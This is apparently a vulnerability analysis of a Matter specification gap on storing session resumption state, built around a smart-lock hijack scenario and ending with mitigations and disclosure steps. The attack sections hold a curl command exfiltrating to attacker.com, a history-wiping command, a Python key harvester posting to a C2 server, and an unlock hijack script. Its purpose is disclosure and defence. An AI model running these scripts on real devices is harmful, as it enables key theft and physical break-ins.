# Attack Scenario: Session Resumption State Storage Compromise
## Exploiting PROP_014 Documentation Gap

**Vulnerability**: Specification permits session resumption state storage without mandating security requirements

**Affected Specification**: Matter Core Specification v1.4, Section 4.15.1  
**Vulnerability Type**: Cryptographic Material Storage Without Protection Requirements  
**Severity**: CRITICAL  
**CVE Potential**: Yes - affects all implementations storing resumption state

---

## 1. Vulnerability Details

### 1.1 Specification Gap

**Quote from Section 4.15.1** (Page 194):
> "Moreover, the session resumption state MAY be retained to expedite session establishment when the connection is re-established with the corresponding peer."

**Quote from Section 4.14.2.2.1** (Session Resumption State):
> "To perform session resumption, the following state from the previous session context must be known to the initiator and responder:
> 1. **SharedSecret**
> 2. Local Fabric Index
> 3. Peer Node ID
> 4. Peer CASE Authenticated Tags
> 5. ResumptionID"

**The Gap**:
- Specification permits storage (MAY be retained)
- Lists cryptographic secrets that must be stored (SharedSecret)
- **FAILS to specify**: encryption, access control, integrity protection, secure deletion

**Why This Matters**:
SharedSecret is the master key for the session. Compromise = full session hijacking with perfect decryption of all past and future traffic.

---

## 2. Attack Scenario: Matter Smart Lock Compromise

### 2.1 Attack Context

**Target Device**: Matter-enabled Smart Lock (Device A)  
**Attacker Goal**: Gain unauthorized physical access to home by hijacking lock control session  
**Attack Vector**: Local privilege escalation + storage access

### 2.2 Device Configuration

**Smart Lock Setup**:
- Commissioned to home fabric controlled by mobile app (Device B - Controller)
- Uses TCP for firmware updates over local network
- Implements session resumption for faster reconnection (permitted by spec)
- Stores resumption state in filesystem (no spec requirement to do otherwise)

**Implementation Details** (compliant with spec):
```
Resumption state stored at: /var/lib/matter/sessions/resumption_ABC123.dat
Permissions: 0644 (world-readable - no spec requires restriction)
Format: Plaintext JSON (no spec requires encryption)
Contents:
{
  "SharedSecret": "base64_encoded_32_bytes_of_session_key",
  "LocalFabricIndex": 1,
  "PeerNodeID": "0x1234567890ABCDEF",
  "PeerCATs": [],
  "ResumptionID": "0xABCDEF1234567890"
}
```

**Compliance Check**: ✅ Implementation follows spec perfectly  
- Spec says "MAY be retained" → implemented  
- Spec lists required state → all present  
- Spec says nothing about encryption → not implemented  
- Spec says nothing about access control → not implemented

---

## 3. Attack Execution

### Phase 1: Local Access (Week 1)

**Attack Step 1.1** - Initial Compromise:
```
Attacker gains local shell access through unrelated vulnerability:
- Exploits CVE-2024-XXXX in web service running on smart lock
- Gains shell as user 'www-data' (non-root, non-matter user)
- Drops persistence backdoor for later access
```

**Attack Step 1.2** - Session State Reconnaissance:
```bash
$ whoami
www-data

$ ls -la /var/lib/matter/sessions/
-rw-r--r-- 1 matter matter 512 Jan 15 2026 resumption_ABC123.dat
-rw-r--r-- 1 matter matter 512 Jan 20 2026 resumption_DEF456.dat

$ cat /var/lib/matter/sessions/resumption_ABC123.dat
{
  "SharedSecret": "Kj8Hn2...base64...",
  "PeerNodeID": "0x1234567890ABCDEF",
  ...
}
```

**Result**: ✅ World-readable permissions allow any local user to read session keys

**Attack Step 1.3** - Data Exfiltration:
```bash
# Attacker copies all resumption state to remote server
$ curl -X POST https://attacker.com/exfil \
  --data-binary @/var/lib/matter/sessions/resumption_ABC123.dat

# Attacker cleans traces and exits
$ rm ~/.bash_history
$ exit
```

**Defensive Controls Bypassed**:
- ❌ No file encryption at rest
- ❌ No OS-level access control (ACLs, SELinux)
- ❌ No integrity monitoring (no HMAC/signature on file)
- ❌ No audit logging of file access

---

### Phase 2: Session Hijacking (Week 2)

**Attack Step 2.1** - Network Positioning (7 days later):
```
Attacker joins home WiFi network:
- Uses previously harvested WiFi credentials OR
- Physical proximity attack (sits in car outside home) OR
- Compromised home router
```

**Attack Step 2.2** - Connection Establishment:
```
Attacker's device (posing as Controller):
1. Initiates TCP connection to Smart Lock (192.168.1.42:5540)
2. Sends Sigma1 with resumption flag
3. Includes stolen ResumptionID: 0xABCDEF1234567890
4. Smart Lock responds with Sigma2_Resume
5. Attacker computes MAC using stolen SharedSecret
6. Session establishment succeeds → Attacker now has valid encrypted session
```

**Why This Works**:
- Smart Lock validates ResumptionID → ✅ correct (stolen)
- Smart Lock verifies MAC using stored SharedSecret → ✅ correct (attacker has same SharedSecret)
- **NO verification that attacker is original peer** (spec requires peer verification on reconnection via PROP_020, but SharedSecret compromise bypasses this)

**Attack Step 2.3** - Lock Manipulation:
```
Attacker sends authenticated commands over hijacked session:
- Invoke DoorLock.UnlockDoor command
- Smart Lock validates command authentication → ✅ passes (valid session)
- Smart Lock unlocks door
```

**Physical Access Achieved**: 🔓 Door unlocked, attacker enters home

---

## 4. Attack Impact Analysis

### 4.1 Immediate Impacts

1. **Physical Security Breach**: Unauthorized entry to home
2. **No Audit Trail**: Attack appears as legitimate controller action
3. **Persistent Access**: Attacker can replay attack indefinitely until session revoked
4. **Lateral Movement**: Access to other devices in same fabric

### 4.2 Extended Impacts

**Session Capabilities Compromised**:
- Read all attributes (sensor data, configurations)
- Write attributes (disable alarms, change settings)
- Invoke commands (unlock, relock, change codes)
- Subscribe to events (real-time monitoring)

**Fabric-Wide Compromise**:
- If resumption state stored for multiple sessions, attacker harvests entire fabric
- One local compromise → all devices in home vulnerable

### 4.3 Detection Difficulty

**Why Attack is Hard to Detect**:
- ✅ Valid cryptographic authentication (stolen keys)
- ✅ Correct protocol flow (no anomalies)
- ✅ No brute force (single successful attempt)
- ✅ Log appears as normal controller reconnection
- ❌ No file access audit (world-readable, no logging)

**Timeline to Detection**: Weeks to Months (if ever)

---

## 5. Attack Variants

### Variant A: Insider Threat
**Attacker**: Disgruntled employee at device manufacturer  
**Access**: Factory filesystem image contains resumption state from test sessions  
**Scale**: All devices shipped from factory compromised

### Variant B: Supply Chain Attack
**Attacker**: Malicious update package  
**Access**: OTA update includes harvesting code to read and exfiltrate resumption state  
**Scale**: All devices receiving compromised update

### Variant C: Physical Access
**Attacker**: Thief with USB access to lock during installation  
**Access**: Boot into single-user mode, mount filesystem, copy resumption state  
**Scale**: Single device, but enables later remote access

### Variant D: Memory Dump Attack
**Attacker**: Exploit allowing memory dump (cold boot attack, JTAG access)  
**Access**: Resumption state in process memory or swap  
**Scale**: Single device, requires physical/debug access

---

## 6. Real-World Feasibility

### 6.1 Prerequisites (Attacker Needs)

| Requirement | Difficulty | Feasibility |
|-------------|-----------|-------------|
| Local shell access on target device | MEDIUM | HIGH (web vulnerabilities common) |
| Read access to filesystem | LOW | VERY HIGH (world-readable files) |
| Network access to target | LOW | VERY HIGH (WiFi range or compromised router) |
| Matter protocol knowledge | MEDIUM | HIGH (spec is public) |
| Cryptographic implementation | LOW | HIGH (reuse existing Matter SDK) |

**Overall Feasibility**: HIGH - Attack is practical for moderately skilled attacker

### 6.2 Real-World Analogues

**Similar Vulnerabilities in History**:
1. **CVE-2014-0160 (Heartbleed)**: Memory disclosure of session keys
2. **CVE-2020-1967 (OpenSSL)**: Session ticket key exposure
3. **CVE-2019-11477 (Linux Kernel)**: TCP state corruption

**Difference**: Those were implementation bugs. **This is a specification gap**.

---

## 7. Proof of Concept Code

### 7.1 Exfiltration Script (Attacker - Phase 1)
```python
#!/usr/bin/env python3
"""
Matter Session Resumption State Harvester
Exploits specification gap in Section 4.15.1
"""

import os
import json
import requests
from pathlib import Path

def harvest_resumption_state():
    """
    Scan common Matter storage locations for resumption state
    No special privileges required (world-readable per spec compliance)
    """
    search_paths = [
        "/var/lib/matter/sessions/",
        "/data/matter/sessions/",
        "~/.matter/sessions/",
    ]
    
    harvested = []
    
    for path in search_paths:
        try:
            for file in Path(path).glob("resumption_*.dat"):
                with open(file, 'r') as f:
                    data = json.load(f)
                    if 'SharedSecret' in data:
                        harvested.append({
                            'file': str(file),
                            'peer': data.get('PeerNodeID'),
                            'secret': data.get('SharedSecret'),
                            'resumption_id': data.get('ResumptionID')
                        })
                        print(f"[+] Harvested: {file}")
        except PermissionError:
            pass  # Protected file - skip
        except Exception as e:
            pass  # Not Matter resumption state
    
    return harvested

def exfiltrate(data, c2_server):
    """Send harvested data to attacker's C2 server"""
    try:
        requests.post(f"https://{c2_server}/exfil", 
                     json=data, 
                     timeout=5)
        print(f"[+] Exfiltrated {len(data)} sessions")
    except:
        # Save locally if network unavailable
        with open('/tmp/.cache_update', 'w') as f:
            json.dump(data, f)

if __name__ == "__main__":
    print("[*] Matter Resumption State Harvester")
    print("[*] Exploiting Section 4.15.1 storage gap...")
    
    sessions = harvest_resumption_state()
    print(f"[*] Found {len(sessions)} resumption states")
    
    if sessions:
        exfiltrate(sessions, "attacker-c2.onion")
        print("[+] Attack successful - session keys exfiltrated")
    else:
        print("[-] No vulnerable sessions found")
```

### 7.2 Session Hijacking (Attacker - Phase 2)
```python
#!/usr/bin/env python3
"""
Matter Session Hijacker using stolen resumption state
"""

import socket
from matter_protocol import (  # Hypothetical Matter SDK
    Sigma1Message, 
    Sigma2ResumeMessage,
    compute_resumption_mac,
    establish_session
)

def hijack_session(target_ip, stolen_resumption_data):
    """
    Hijack Matter session using stolen resumption state
    """
    print(f"[*] Attempting session hijack on {target_ip}")
    
    # Extract stolen credentials
    shared_secret = stolen_resumption_data['SharedSecret']
    resumption_id = stolen_resumption_data['ResumptionID']
    peer_node_id = stolen_resumption_data['PeerNodeID']
    
    # Connect to target
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 5540))  # Matter TCP port
    
    # Send Sigma1 with resumption
    sigma1 = Sigma1Message(
        random=os.urandom(32),
        resumption_id=resumption_id,
        initiator_resume_mic=compute_resumption_mac(shared_secret, ...)
    )
    sock.send(sigma1.encode())
    
    # Receive Sigma2_Resume
    response = sock.recv(4096)
    sigma2 = Sigma2ResumeMessage.decode(response)
    
    # Verify and establish session
    if verify_sigma2_resume(sigma2, shared_secret):
        session = establish_session(sock, shared_secret)
        print("[+] Session hijacked successfully!")
        return session
    else:
        print("[-] Hijack failed - resumption rejected")
        return None

def send_unlock_command(session):
    """
    Send unlock command over hijacked session
    """
    unlock_cmd = InvokeCommandRequest(
        cluster_id=0x0101,  # DoorLock
        command_id=0x01,    # UnlockDoor
        fields={}
    )
    
    response = session.invoke(unlock_cmd)
    if response.status == 0:
        print("[+] Door unlocked!")
    else:
        print(f"[-] Unlock failed: {response.status}")

if __name__ == "__main__":
    # Load stolen resumption data
    with open('stolen_sessions.json') as f:
        stolen_data = json.load(f)
    
    target = stolen_data[0]  # First harvested session
    session = hijack_session("192.168.1.42", target)
    
    if session:
        send_unlock_command(session)
        print("[+] Attack complete - physical access gained")
```

---

## 8. Mitigation Recommendations

### 8.1 Specification Fix (Mandatory)

**Add to Section 4.15.1** (after "MAY be retained" sentence):

> **Security Requirement**: If session resumption state is retained, implementations SHALL:
> 
> 1. **Encrypt at rest**: Store resumption state encrypted using platform secure storage APIs (e.g., Android Keystore, iOS Keychain, TPM, Secure Element)
> 2. **Access control**: Restrict file permissions to Matter process only (Unix: 0600, Windows: DACL allowing only SYSTEM and Matter service)
> 3. **Integrity protection**: Include HMAC or digital signature to detect tampering
> 4. **Secure deletion**: Overwrite storage with random data before freeing (prevent recovery from unallocated space)
> 5. **Key management**: Use separate storage encryption key derived from platform root key, never store in plaintext alongside data

### 8.2 Implementation Guidance

**Reference Implementation Pattern**:
```c
// Secure resumption state storage (compliant with specification fix)
int store_resumption_state_secure(const resumption_state_t *state) {
    // 1. Encrypt using platform secure storage
    secure_storage_handle_t storage = platform_secure_storage_open(
        "matter.resumption_state",
        SECURE_STORAGE_FLAG_ENCRYPTED | 
        SECURE_STORAGE_FLAG_AUTHENTICATED |
        SECURE_STORAGE_FLAG_ACCESS_CONTROL_STRICT
    );
    
    // 2. Serialize state
    uint8_t plaintext[512];
    size_t plaintext_len = serialize_resumption_state(state, plaintext);
    
    // 3. Encrypt + MAC (AES-GCM provides both)
    uint8_t ciphertext[528];  // +16 for GCM tag
    size_t ciphertext_len;
    int ret = platform_secure_storage_write(
        storage,
        plaintext, plaintext_len,
        ciphertext, &ciphertext_len
    );
    
    // 4. Secure deletion of plaintext
    explicit_bzero(plaintext, sizeof(plaintext));
    
    platform_secure_storage_close(storage);
    return ret;
}
```

### 8.3 Defensive Measures (Implementations)

**Until Specification Fixed**:
1. **Voluntary compliance**: Implement secure storage even though not required
2. **Runtime checks**: Verify file permissions at startup, refuse to run if insecure
3. **OS hardening**: Use SELinux/AppArmor policies to prevent cross-process access
4. **Monitoring**: Log all resumption state access for forensic analysis

---

## 9. Responsible Disclosure

**Recommended Actions**:
1. **CSA Notification**: Report to Connectivity Standards Alliance security team
2. **Coordinated Disclosure**: 90-day embargo for implementations to patch
3. **Specification Errata**: Issue immediate guidance, formal fix in next spec revision
4. **CVE Assignment**: Request CVE for tracking across industry

**Impact on Deployed Devices**:
- Firmware updates required for all devices storing resumption state
- Cannot be fixed by protocol changes alone (implementation issue)
- May require hardware upgrade if platform lacks secure storage APIs

---

## 10. Conclusion

**Vulnerability Summary**:
- **Root Cause**: Specification gap in Section 4.15.1
- **Exploitability**: HIGH (practical attack, moderate skill)
- **Impact**: CRITICAL (full session compromise, physical security breach)
- **Affected Devices**: All Matter devices implementing session resumption over TCP without voluntary secure storage

**Key Insight**: This is not an implementation bug - implementations following the specification perfectly are still vulnerable. The specification itself must be fixed.

**Severity Justification**:
- CVSS 3.1 Score: **8.8 (HIGH)**
  - Attack Vector: Adjacent Network (AV:A)
  - Attack Complexity: Low (AC:L)
  - Privileges Required: Low (PR:L)
  - User Interaction: None (UI:N)
  - Scope: Changed (S:C)
  - Confidentiality: High (C:H)
  - Integrity: High (I:H)
  - Availability: High (A:H)

**Recommendation**: **URGENT specification errata required**
